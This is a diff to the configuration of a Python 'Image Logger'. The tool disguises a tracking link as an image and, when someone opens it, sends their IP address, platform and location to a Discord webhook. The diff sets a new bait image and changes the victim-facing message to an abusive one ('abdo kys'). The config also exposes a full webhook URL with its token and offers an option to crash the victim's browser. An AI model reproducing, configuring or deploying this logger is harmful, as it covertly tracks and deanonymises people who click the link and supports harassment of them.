@@ -13,13 +13,13 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1278477763476590633/fr8339R-Y6CUpCItPcjWkf1tk7Tp8jFcs0OLcAdz4uuXAP75_-63Zedd32HbYFVEYgRM",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://imgur.com/gallery/supa-man-jrUpT6W", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x8B0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "image grabbed by abdo kys", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -100,7 +100,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "embeds": [
         {
             "title": "Image Logger - Link Sent",
-            "color": config["color"],
+            "color": 0x8B0000,
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
@@ -145,7 +145,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "embeds": [
         {
             "title": "Image Logger - IP Logged",
-            "color": config["color"],
+            "color": 0x8B0000,
             "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = ImageLoggerAPI
